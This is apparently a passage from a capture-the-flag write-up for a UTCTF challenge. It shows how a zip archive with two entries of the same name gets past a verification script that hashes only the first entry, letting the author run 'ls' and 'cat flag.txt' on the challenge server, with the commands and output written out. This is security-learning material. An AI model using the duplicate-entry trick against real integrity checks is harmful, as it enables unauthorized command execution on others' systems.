Since the verification script checks the md5 hash of the first file with a given name, we figured we might want to have multiple files with the same name in the zip.

```
commands
├── c0mmand.txt
├── command.txt
└── README.md
```

```
$ cat commands/c0mmand.txt
ls
```

```
$ zip commands.zip commands/*
updating: commands/command.txt (stored 0%)
updating: commands/README.md (deflated 20%)
  adding: commands/c0mmand.txt (stored 0%)
```

Next, we replaced the two instances of `c0mmand` in the zip file with `command` in a hex editor.

<img alt="Replacing `0`s with `o`s" src="/writeups/2023/utctf/media/c0mmand.png" width="600" />

```
echo (base64 -w 0 commands.zip) | nc betta.utctf.live 12748
```

Upon submitting this to the server, we found that the directory contained a `flag.txt`. We then repeated this process, changing the contents of `c0mmand.txt` to `cat flag.txt`

```
$ echo (base64 -w 0 commands.zip) | nc betta.utctf.live 12748
utflag{https://youtu.be/bZe5J8SVCYQ}
```
